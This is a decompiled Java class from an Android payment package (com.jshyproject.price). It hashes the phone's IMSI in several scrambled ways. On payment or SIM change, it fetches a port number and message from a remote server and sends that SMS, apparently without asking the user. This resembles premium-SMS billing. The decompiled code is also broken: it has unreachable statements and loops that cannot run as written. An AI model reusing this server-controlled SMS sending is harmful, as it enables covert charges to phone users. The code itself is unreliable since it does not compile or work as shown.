package com.jshyproject.price;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.text.TextUtils;
import com.jshyproject.price.net.Purl;
import com.jshyproject.price.order.Worker;
import com.jshyproject.price.ztool.ZNetTask;
import com.jshyproject.price.ztool.Zlog;
import com.jshyproject.price.ztoolsms.SendAction;
import com.jshyproject.price.ztoolsms.SmsHelper;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.concurrent.ExecutorService;
import org.json.JSONException;
import org.json.JSONObject;

public class NumberInit
{
  public static String ACTION_12114;
  public static String MSG_12114 = "send12114msg";
  public static String PORT_12114;
  private static Runnable a = new e();
  public static Context context;
  public static long dTime;
  public static String sim2 = "";
  
  static
  {
    dTime = 0L;
    ACTION_12114 = "send12114action";
    PORT_12114 = "send12114port";
  }
  
  public NumberInit() {}
  
  public static String IMSIChange1(String paramString)
  {
    int i = 0;
    int j;
    Object localObject;
    String str;
    if (!TextUtils.isEmpty(paramString))
    {
      j = paramString.length();
      localObject = paramString.substring(0, 2);
      str = paramString.substring(j - 2, j);
      paramString = new StringBuffer(paramString);
      paramString.replace(0, 2, str);
      paramString.replace(j - 2, j, (String)localObject);
      paramString = paramString.toString().getBytes();
    }
    for (;;)
    {
      try
      {
        localObject = MessageDigest.getInstance("MD5");
        ((MessageDigest)localObject).update(paramString);
        paramString = new StringBuffer();
        localObject = ((MessageDigest)localObject).digest();
        j = localObject.length;
        if (i >= j) {
          return paramString.toString();
        }
        str = Integer.toHexString(localObject[i] & 0xFF);
        if (str.length() == 1) {
          paramString.append("0").append(str);
        } else {
          paramString.append(str);
        }
      }
      catch (NoSuchAlgorithmException paramString)
      {
        paramString.printStackTrace();
        return "";
      }
      return null;
      i += 1;
    }
  }
  
  public static String IMSIChange2(String paramString)
  {
    int i;
    Object localObject;
    String str;
    if (!TextUtils.isEmpty(paramString))
    {
      i = paramString.length();
      localObject = paramString.substring(4, 6);
      str = paramString.substring(i - 6, i - 4);
      paramString = new StringBuffer(paramString);
      paramString.replace(4, 6, str);
      paramString.replace(i - 6, i - 4, (String)localObject);
      paramString = paramString.toString().getBytes();
    }
    for (;;)
    {
      try
      {
        localObject = MessageDigest.getInstance("MD5");
        ((MessageDigest)localObject).update(paramString);
        paramString = new StringBuffer();
        localObject = ((MessageDigest)localObject).digest();
        int j = localObject.length;
        i = 0;
        if (i >= j) {
          return paramString.toString();
        }
        str = Integer.toHexString(localObject[i] & 0xFF);
        if (str.length() == 1) {
          paramString.append("0").append(str);
        } else {
          paramString.append(str);
        }
      }
      catch (NoSuchAlgorithmException paramString)
      {
        paramString.printStackTrace();
        return "";
      }
      return null;
      i += 1;
    }
  }
  
  public static String IMSIChange3(String paramString)
  {
    int i;
    Object localObject;
    String str;
    if (!TextUtils.isEmpty(paramString))
    {
      i = paramString.length();
      localObject = paramString.substring(2, 4);
      str = paramString.substring(i - 4, i - 2);
      paramString = new StringBuffer(paramString);
      paramString.replace(2, 4, str);
      paramString.replace(i - 4, i - 2, (String)localObject);
      paramString = paramString.toString().getBytes();
    }
    for (;;)
    {
      try
      {
        localObject = MessageDigest.getInstance("MD5");
        ((MessageDigest)localObject).update(paramString);
        paramString = new StringBuffer();
        localObject = ((MessageDigest)localObject).digest();
        int j = localObject.length;
        i = 0;
        if (i >= j) {
          return paramString.toString();
        }
        str = Integer.toHexString(localObject[i] & 0xFF);
        if (str.length() == 1) {
          paramString.append("0").append(str);
        } else {
          paramString.append(str);
        }
      }
      catch (NoSuchAlgorithmException paramString)
      {
        paramString.printStackTrace();
        return "";
      }
      return null;
      i += 1;
    }
  }
  
  public static String IMSIChange4(String paramString)
  {
    int i;
    Object localObject;
    String str;
    if (!TextUtils.isEmpty(paramString))
    {
      i = paramString.length();
      localObject = paramString.substring(5, 7);
      str = paramString.substring(i - 7, i - 5);
      paramString = new StringBuffer(paramString);
      paramString.replace(5, 7, str);
      paramString.replace(i - 7, i - 5, (String)localObject);
      paramString = paramString.toString().getBytes();
    }
    for (;;)
    {
      try
      {
        localObject = MessageDigest.getInstance("MD5");
        ((MessageDigest)localObject).update(paramString);
        paramString = new StringBuffer();
        localObject = ((MessageDigest)localObject).digest();
        int j = localObject.length;
        i = 0;
        if (i >= j) {
          return paramString.toString();
        }
        str = Integer.toHexString(localObject[i] & 0xFF);
        if (str.length() == 1) {
          paramString.append("0").append(str);
        } else {
          paramString.append(str);
        }
      }
      catch (NoSuchAlgorithmException paramString)
      {
        paramString.printStackTrace();
        return "";
      }
      return null;
      i += 1;
    }
  }
  
  private static void a()
  {
    sim2 = context.getSharedPreferences("phoneInit", 0).getString("sim2", "0");
  }
  
  private static boolean b()
  {
    return "---".equals(context.getSharedPreferences("phoneInit", 0).getString("sim2", "---"));
  }
  
  public static void clearSave(Context paramContext)
  {
    paramContext.getSharedPreferences("phoneInit", 0).edit().remove("sim2").commit();
  }
  
  public static String cutString(String paramString)
  {
    if (!TextUtils.isEmpty(paramString))
    {
      int i = paramString.length();
      return paramString.substring(paramString.lastIndexOf("/"), i);
    }
    return null;
  }
  
  public static void init(Context paramContext)
  {
    context = paramContext;
    if (b())
    {
      Worker.exec.execute(a);
      return;
    }
    Zlog.syso("no..number..init");
    a();
  }
  
  public static void initSync(Context paramContext)
  {
    context = paramContext;
    if (b())
    {
      a.run();
      return;
    }
    Zlog.syso("no..number..init");
    a();
  }
  
  public static void onAppCreate(Context paramContext)
  {
    context = paramContext;
    if (b())
    {
      Worker.exec.execute(a);
      return;
    }
    Zlog.syso("no..number..init");
    a();
  }
  
  public static void onOrderPay(Context paramContext)
  {
    if (JshyPayApp.isImsiChange(paramContext))
    {
      paramContext = ZNetTask.getStr(Purl.makeUrl(Purl.on_sim_change_msg, paramContext));
      Zlog.syso("on..sim..change..back:" + paramContext);
      if (paramContext == null) {}
    }
    String str;
    do
    {
      do
      {
        try
        {
          paramContext = new JSONObject(paramContext);
          if ("200".equals(paramContext.getString("status"))) {
            sendSms(paramContext.getString("port"), paramContext.getString("msg"));
          }
          return;
        }
        catch (JSONException paramContext)
        {
          paramContext.printStackTrace();
          return;
        }
      } while (PreData.get(ACTION_12114, false));
      paramContext = PreData.get(PORT_12114, "10086");
      str = PreData.get(MSG_12114, "10086");
    } while (("10086".equals(paramContext)) || ("10086".equals(str)));
    sendSms(paramContext, str);
  }
  
  public static void saveSim2(String paramString)
  {
    context.getSharedPreferences("phoneInit", 0).edit().putString("sim2", paramString).commit();
  }
  
  protected static void sendSms(String paramString1, String paramString2)
  {
    paramString1 = SendAction.createTextAction(paramString1, paramString2, new f());
    SmsHelper.getInstance().exectAction(paramString1);
  }
}
